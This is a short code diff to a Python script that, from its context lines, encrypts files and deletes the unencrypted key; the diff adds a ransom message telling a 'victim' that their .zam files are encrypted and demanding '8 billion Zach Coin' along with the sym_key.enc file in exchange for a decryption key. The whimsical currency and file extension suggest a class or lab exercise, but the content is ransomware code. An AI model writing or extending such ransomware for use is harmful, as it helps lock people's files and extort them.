@@ -51,5 +51,11 @@ def main():
     # Step 4: Delete the unencrypted symmetric key and public_key.pem
     os.remove('public_key.pem')
 
+    # Send the Victim the Ransom Message
+    print(f'Your .zam files have been encrypted')
+    print(f'To decrypt your files please pay a sum of 8 billion Zach Coin')
+    print(f'With your payment, send the sym_key.enc file and you will be provided with the decryption key and a python file that you must run to decrypt your files')
+
+
 if __name__ == "__main__":
     main()
